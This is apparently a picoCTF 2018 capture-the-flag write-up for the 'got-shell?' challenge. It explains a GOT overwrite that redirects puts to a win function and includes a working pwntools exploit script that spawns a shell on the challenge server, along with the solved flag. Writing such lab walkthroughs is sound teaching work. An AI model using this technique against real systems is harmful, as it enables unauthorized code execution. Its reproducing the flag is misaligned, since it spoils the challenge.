> got-shell? - Points: 350 - (Solves: 85)
> Can you authenticate to this service and get the flag? Connect to it with nc 2018shell1.picoctf.com 46464. Source


This seems to be a GOT overwrite challenge where you can supply a memory and overwrite it with whatever you'd like.

In this case we need 2 addresses, the GOT table address we want to overwrite and the address we want to overwrite it with.

Using ida we find the GOT address for a library function. I'll use puts.

`Puts GOT address = 0x804A00C`

And the address to the win function is `0x0804854B`.

Using a small python script we can easily exploit the program to get a shell:

```python
from pwn import *

c = connect("2018shell1.picoctf.com", 46464)

c.sendline("804A00C")
c.sendline("0804854B")

# at this point we have a shell
# and we simply need to `cat flag.txt` to get the flag
c.interactive()

```

Flag: `picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_7a9e7634}`
